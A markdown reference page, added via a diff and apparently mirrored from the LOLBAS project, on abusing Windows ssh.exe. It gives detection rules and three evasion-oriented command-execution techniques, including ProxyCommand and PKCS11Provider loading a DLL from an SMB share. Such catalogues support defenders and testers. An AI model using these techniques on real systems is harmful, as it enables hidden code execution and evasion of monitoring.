@@ -1,0 +1,77 @@
+---
+title: "ssh.exe"
+source: lolbas-project.github.io
+source_url: https://lolbas-project.github.io/lolbas/Binaries/Ssh/
+fetched_at: 2026-09-20T17:11:42Z
+license: unspecified
+category: windows
+---
+
+Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.
+
+## Paths
+- c:\windows\system32\OpenSSH\ssh.exe
+
+## Resources
+- [https://gtfobins.github.io/gtfobins/ssh/](https://gtfobins.github.io/gtfobins/ssh/)
+- [https://gist.github.com/screetsec/97d90750bfb058eb0b49c5374cdc0ac9](https://gist.github.com/screetsec/97d90750bfb058eb0b49c5374cdc0ac9)
+
+## Acknowledgements
+- Akshat Pradhan
+- Felix Boulet
+- Edo Maland
+
+## Detections
+- Sigma: [https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ssh.yml](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ssh.yml)
+- IOC: Event ID 4624 with process name C:\Windows\System32\OpenSSH\sshd.exe.
+- IOC: command line arguments specifying execution.
+
+## Execute
+
+1. Executes specified command on host machine. The prompt for password can be eliminated by adding the host’s public key in the user’s authorized_keys file. Adversaries can do the same for execution on remote machines.
+
+```
+ssh localhost "{CMD}"
+```
+
+   - Use case: Execute specified command, can be used for defense evasion.
+
+   - Privileges required: User
+
+   - Operating systems: Windows 10 1809, Windows Server 2019
+
+   - ATT&CK® technique: T1202
+
+   - Tags: Execute: CMD
+
+2. Executes specified command from ssh.exe
+
+```
+ssh -o ProxyCommand="{CMD}" .
+```
+
+   - Use case: Performs execution of specified file, can be used as a defensive evasion.
+
+   - Privileges required: User
+
+   - Operating systems: Windows 10
+
+   - ATT&CK® technique: T1202
+
+   - Tags: Execute: CMD
+
+3. Executes a DLL from an SMB share by abusing the PKCS11Provider option. The payload executes upon DLL load (DllMain) and requires exporting C_GetFunctionList to prevent premature termination by ssh.exe. Note that all backslashes should be escaped (i.e. every \ should be turned into \\).
+
+```
+ssh -o PKCS11Provider="\\\\127.0.0.1\\Temp\\example.dll" win@github.com
+```
+
+   - Use case: Performs indirect execution of a specified DLL from a remote share, can be used for defense evasion.
+
+   - Privileges required: User
+
+   - Operating systems: Windows 10, Windows 11
+
+   - ATT&CK® technique: T1202
+
+   - Tags: Execute: DLLExecute: Remote
